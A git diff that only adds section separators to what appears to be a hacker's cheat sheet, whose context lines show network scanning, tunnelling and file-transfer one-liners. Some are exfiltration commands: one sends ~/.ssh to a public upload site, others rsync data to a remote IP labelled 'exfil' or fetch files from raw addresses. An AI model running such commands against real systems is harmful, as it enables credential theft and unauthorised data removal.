@@ -444,6 +444,7 @@ NET="10.11.0"  # discover 10.11.0.1-10.11.0.254
 seq 1 254 | xargs -P20 -I{} ping -n -c3 -i0.2 -w1 -W200 "${NET:-192.168.0}.{}" | grep 'bytes from' | awk '{print $4" "$7;}' | sort -uV -k1,1
 ```
 
+---
 <a id="tcpdump"></a>
 **3.ii. tcpdump**
 
@@ -458,6 +459,7 @@ tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo
 tcpdump -s0 -nAq 'tcp and (ip[2:2] > 60)'
 ```
 
+---
 <a id="tunnel"></a>
 **3.iii. Tunnel and forwarding**
 
@@ -474,6 +476,7 @@ openssl s_client -connect smtp.gmail.com:465
 socat TCP-LISTEN:25,reuseaddr,fork  openssl-connect:smtp.gmail.com:465
 ```
 
+---
 <a id="ports"></a>
 **3.iii.a Raw TCP reverse ports**
 
@@ -493,6 +496,7 @@ See also [remote.moe](#revese-shell-remote-moe) (free) to forward raw TCP from t
 
 Other free services are limited to forward HTTPS only (not raw TCP). Some tricks below show how to tunnel raw TCP over HTTPS forwards (using websockets).
 
+---
 <a id="https"></a>
 **3.iii.b HTTPS reverse tunnels**
 
@@ -544,6 +548,7 @@ curl -x socks5h://0 ipinfo.io
 
 More: [https://github.com/twelvesec/port-forwarding](https://github.com/twelvesec/port-forwarding) and [Tunnel via Cloudflare to any TCP Service](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) and [Awesome Tunneling](https://github.com/anderspitman/awesome-tunneling).
 
+---
 <a id="scan-proxy"></a>
 **3.iv. Use any tool via Socks Proxy**
 
@@ -581,6 +586,7 @@ graftcp ssh root@192.168.1.1
 graftcp nmap -n -Pn -sV -F --open 19.168.1.1
 ```
 
+---
 <a id="your-ip"></a>
 **3.v. Find your public IP address**
 
@@ -617,6 +623,7 @@ curl -x socks5h://localhost:9050 -s https://check.torproject.org/api/ip
 ### Result should be {"IsTor":true...
 ```
 
+---
 <a id="check-reachable"></a>
 **3.vi. Check reachability from around the world**
 
@@ -630,6 +637,7 @@ ooniprobe list
 ooniprobe list 1
 ```
 
+---
 <a id="check-open-ports"></a>
 **3.vii. Check/Scan Open Ports on an IP**
 
@@ -646,6 +654,7 @@ nmap -sCV -F -Pn --min-rate 10000 scanme.nmap.org
 nmap -A -F -Pn --min-rate 10000 --script vulners.nse --script-timeout=5s scanme.nmap.org
 ```
 
+---
 <a id="bruteforce"></a>
 **3.viii. Crack Password hashes**
 
@@ -863,6 +872,7 @@ xxd -p </etc/issue.net
 xxd -p -r >issue.net-COPY
 ```
 
+---
 <a id="cut-paste"></a>
 ### 4.ii. File transfer - using cut & paste
 
@@ -873,6 +883,7 @@ cat >output.txt <<-'__EOF__'
 __EOF__  ### Finish your cut & paste by typing __EOF__
 ```
 
+---
 <a id="file-transfer-screen"></a>
 ### 4.iii. File transfer - using *screen*
 
@@ -925,6 +936,7 @@ Get *screen* to slurp the base64 encoded data into screen's clipboard and paste 
 
 Note: Two CTRL-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).
 
+---
 <a id="file-transfer-gs-netcat"></a>
 ### 4.iv. File transfer - using gs-netcat and sftp
 
@@ -949,6 +961,7 @@ gs-netcat -l <"FILENAME" # Will output a SECRET used by the receiver
 gs-netcat >"FILENAME"  # When prompted, enter the SECRET from the sender
 ```
 
+---
 <a id="http"></a>
 ### 4.v. File transfer - using HTTPs
 
@@ -981,6 +994,7 @@ On the Sender:
 curl -X POST  https://CF-URL-CHANGE-ME.trycloudflare.com/upload -F 'files=@myfile.txt'
 ```
 
+---
 <a id="burl"></a>
 ### 4.vi. File transfer without curl
 
@@ -997,6 +1011,7 @@ burl() {
 # PORT=31337 burl http://37.120.235.188/blah.tar.gz >blah.tar.gz
 ```
 
+---
 <a id="trans"></a>
 ### 4.vii. File transfer using a public dump
 
@@ -1019,6 +1034,7 @@ transfer ~/.ssh       # An entire directory
 ```
 A list of our [favorite public upload sites](#cloudexfil).
 
+---
 <a id="rsync"></a>
 ### 4.viii. File transfer - using rsync
 
@@ -1060,6 +1076,7 @@ rsync -ahPRv -e "bash -c 'openssl s_client -connect 1.2.3.4:31337 -servername th
 Rsync can be combined to exfil via [https / cloudflared raw TCP tunnels](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service).  
 (To exfil from Windows, use the rsync.exe from the [gsocket windows package](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-cygwin_full.zip)). A noisier solution is [syncthing](https://syncthing.net/).
 
+---
 <a id="webdav"></a>
 ### 4.ix. File transfer - using WebDAV
 
@@ -1097,6 +1114,7 @@ Or mount the WebDAV share on Windows (Z:/):
 net use * \\example-foo-bar-lights.trycloudflare.com@SSL\sources
 ```
 
+---
 <a id="tg"></a>
 ### 4.x. File transfer to Telegram
 
